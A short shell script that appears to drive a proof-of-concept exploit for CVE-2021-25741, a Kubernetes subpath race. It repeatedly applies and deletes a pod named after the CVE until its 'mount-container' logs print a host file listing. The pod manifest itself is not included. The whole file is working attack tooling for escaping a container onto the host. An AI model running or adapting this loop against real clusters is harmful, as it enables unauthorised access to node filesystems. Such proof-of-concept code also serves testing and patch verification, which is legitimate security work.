#!/bin/sh

while [ 1 -lt 2 ]
do
	kubectl apply -f pod.yaml;
	sleep 10; # you can change it if 10 second is not enough for deploy in your cluster
	listing=$(kubectl logs cve202125741 mount-container);
	if [ "$listing" = "" ];
	then
		echo 'Bad attempt. Trying one more time.';
		kubectl delete -f pod.yaml;
	else
		echo $listing;
		echo 'Success!';
		exit;
	fi
done